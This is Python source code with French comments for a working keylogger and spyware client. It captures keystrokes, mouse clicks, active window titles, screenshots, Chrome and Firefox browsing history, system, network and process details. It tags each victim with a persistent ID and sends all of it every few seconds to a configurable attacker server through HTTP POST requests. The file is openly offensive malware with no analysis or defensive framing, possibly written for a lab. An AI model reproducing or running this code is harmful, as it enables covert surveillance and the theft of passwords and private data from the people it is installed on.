import os
import sys
import time
import json
import uuid
import threading
import socket
import platform
import subprocess
import requests
from io import BytesIO
from datetime import datetime
from pynput import keyboard, mouse
import psutil
import pygetwindow as gw
from PIL import ImageGrab
import base64
import sqlite3
import shutil
from pathlib import Path

# Configuration
ATTACKER_SERVER = "http://192.168.56.1:5000"  # À remplacer avec l'IP de l'attaquant
REPORT_INTERVAL = 10  # Secondes entre chaque rapport
SCREENSHOT_INTERVAL = 30  # Secondes entre chaque capture d'écran

# Variables globales
victim_id = None
log_data = {
    "keystrokes": "",
    "mouse_clicks": [],
    "active_windows": [],
    "system_info": {},
    "network_info": {},
    "processes": [],
    "screenshots": []
}
last_screenshot_time = 0

def get_victim_id():
    """Génère ou récupère l'ID unique de la victime"""
    global victim_id
    id_file = os.path.join(os.path.expanduser("~"), ".victim_id")
    
    if os.path.exists(id_file):
        with open(id_file, "r") as f:
            victim_id = f.read().strip()
    else:
        victim_id = str(uuid.uuid4())
        with open(id_file, "w") as f:
            f.write(victim_id)
    
    return victim_id

def get_system_info():
    """Collecte des informations système détaillées"""
    try:
        info = {
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "processor": platform.processor(),
            "username": os.path.expanduser("~").split(os.sep)[-1],
            "ram": str(round(psutil.virtual_memory().total / (1024**3))) + " GB",
            "python_version": platform.python_version()
        }
        return info
    except Exception as e:
        print(f"Erreur lors de la collecte des infos système: {e}")
        return {}

def get_network_info():
    """Collecte des informations réseau"""
    try:
        # Obtenir l'adresse IP locale
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Obtenir l'adresse IP publique
        try:
            public_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        except:
            public_ip = "Inconnue"
        
        # Obtenir l'adresse MAC
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        except:
            mac = "Inconnue"
            
        return {
            "local_ip": local_ip,
            "public_ip": public_ip,
            "mac_address": mac
        }
    except Exception as e:
        print(f"Erreur lors de la collecte des infos réseau: {e}")
        return {}

def get_running_processes():
    """Collecte la liste des processus en cours d'exécution"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                processes.append({
                    "pid": proc.info['pid'],
                    "name": proc.info['name'],
                    "username": proc.info['username']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return processes[:20]  # Limiter à 20 processus pour réduire la taille
    except Exception as e:
        print(f"Erreur lors de la collecte des processus: {e}")
        return []

def take_screenshot():
    """Prend une capture d'écran et la retourne en base64"""
    try:
        screenshot = ImageGrab.grab()
        # Convertir l'image en base64 pour l'envoi
        buffered = BytesIO()
        screenshot.save(buffered, format="JPEG", quality=75)
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return img_str
    except Exception as e:
        print(f"Erreur lors de la capture d'écran: {e}")
        return None

def get_browser_history():
    """Tente d'extraire l'historique du navigateur (Chrome/Firefox)"""
    history = []
    try:
        # Pour Chrome
        chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        if os.path.exists(chrome_path):
            temp_path = os.path.join(os.path.expanduser("~"), "temp_chrome_history")
            shutil.copy2(chrome_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            for row in cursor.fetchall():
                history.append({
                    "url": row[0],
                    "title": row[1],
                    "timestamp": datetime.fromtimestamp(row[2]/1000000-11644473600).strftime('%Y-%m-%d %H:%M:%S')
                })
            conn.close()
            os.remove(temp_path)
    except Exception as e:
        print(f"Erreur lors de l'extraction de l'historique Chrome: {e}")
    
    try:
        # Pour Firefox
        firefox_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                if profile.endswith(".default-release"):
                    places_path = os.path.join(firefox_path, profile, "places.sqlite")
                    temp_path = os.path.join(os.path.expanduser("~"), "temp_firefox_history")
                    shutil.copy2(places_path, temp_path)
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 10")
                    for row in cursor.fetchall():
                        history.append({
                            "url": row[0],
                            "title": row[1],
                            "timestamp": datetime.fromtimestamp(row[2]/1000000).strftime('%Y-%m-%d %H:%M:%S')
                        })
                    conn.close()
                    os.remove(temp_path)
    except Exception as e:
        print(f"Erreur lors de l'extraction de l'historique Firefox: {e}")
    
    return history

def on_key_press(key):
    """Callback pour les frappes de clavier"""
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_data["keystrokes"] += key.char
        else:
            if key == keyboard.Key.space:
                log_data["keystrokes"] += " "
            elif key == keyboard.Key.enter:
                log_data["keystrokes"] += "\n"
            elif key == keyboard.Key.backspace:
                log_data["keystrokes"] += "[BACKSPACE]"
            elif key == keyboard.Key.tab:
                log_data["keystrokes"] += "[TAB]"
            else:
                log_data["keystrokes"] += f"[{str(key)}]"
    except Exception as e:
        print(f"Erreur lors de la capture de touche: {e}")

def on_mouse_click(x, y, button, pressed):
    """Callback pour les clics de souris"""
    if pressed:
        try:
            active_window = gw.getActiveWindow()
            window_title = active_window.title if active_window else "Inconnue"
            log_data["mouse_clicks"].append({
                "x": x,
                "y": y,
                "button": str(button),
                "window": window_title,
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
        except Exception as e:
            print(f"Erreur lors de la capture de clic: {e}")

def track_active_window():
    """Suit les fenêtres actives"""
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            window_info = {
                "title": active_window.title,
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            # Éviter les doublons
            if not log_data["active_windows"] or log_data["active_windows"][-1]["title"] != window_info["title"]:
                log_data["active_windows"].append(window_info)
                # Limiter la taille de la liste
                if len(log_data["active_windows"]) > 50:
                    log_data["active_windows"] = log_data["active_windows"][-25:]
    except Exception as e:
        print(f"Erreur lors du suivi de fenêtre: {e}")

def send_data_to_attacker():
    """Envoie les données collectées à l'attaquant"""
    global log_data, last_screenshot_time
    
    try:
        # Ajouter des informations supplémentaires avant l'envoi
        log_data["system_info"] = get_system_info()
        log_data["network_info"] = get_network_info()
        log_data["processes"] = get_running_processes()
        log_data["browser_history"] = get_browser_history()
        
        # Prendre une capture d'écran à intervalles réguliers
        current_time = time.time()
        if current_time - last_screenshot_time >= SCREENSHOT_INTERVAL:
            screenshot = take_screenshot()
            if screenshot:
                log_data["screenshots"].append({
                    "image": screenshot,
                    "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
                # Limiter le nombre de captures
                if len(log_data["screenshots"]) > 5:
                    log_data["screenshots"] = log_data["screenshots"][-3:]
            last_screenshot_time = current_time
        
        # Préparer les données pour l'envoi
        payload = {
            "victim_id": victim_id,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "data": log_data
        }
        
        # Envoyer les données
        response = requests.post(
            f"{ATTACKER_SERVER}/api/data",
            json=payload,
            timeout=10
        )
        
        if response.status_code == 200:
            print(f"Données envoyées avec succès à {datetime.now()}")
            # Vider les logs après envoi réussi
            log_data["keystrokes"] = ""
            log_data["mouse_clicks"] = []
        else:
            print(f"Erreur lors de l'envoi: {response.status_code}")
            
    except Exception as e:
        print(f"Erreur lors de l'envoi des données: {e}")

def periodic_report():
    """Rapport périodique des données"""
    while True:
        time.sleep(REPORT_INTERVAL)
        send_data_to_attacker()

def main():
    """Fonction principale"""
    global victim_id
    
    # Obtenir ou générer l'ID de la victime
    victim_id = get_victim_id()
    print(f"Keylogger démarré pour la victime: {victim_id}")
    
    # Envoyer les informations système initiales
    initial_data = {
        "victim_id": victim_id,
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "system_info": get_system_info(),
        "network_info": get_network_info(),
        "processes": get_running_processes(),
        "browser_history": get_browser_history()
    }
    
    try:
        requests.post(
            f"{ATTACKER_SERVER}/api/init",
            json=initial_data,
            timeout=10
        )
        print("Informations initiales envoyées")
    except Exception as e:
        print(f"Erreur lors de l'envoi des informations initiales: {e}")
    
    # Démarrer les listeners
    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(on_click=on_mouse_click)
    
    keyboard_listener.start()
    mouse_listener.start()
    
    # Démarrer le thread de rapport périodique
    report_thread = threading.Thread(target=periodic_report)
    report_thread.daemon = True
    report_thread.start()
    
    # Suivi des fenêtres actives
    while True:
        track_active_window()
        time.sleep(2)  # Vérifier toutes les 2 secondes

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Keylogger arrêté")
        sys.exit(0)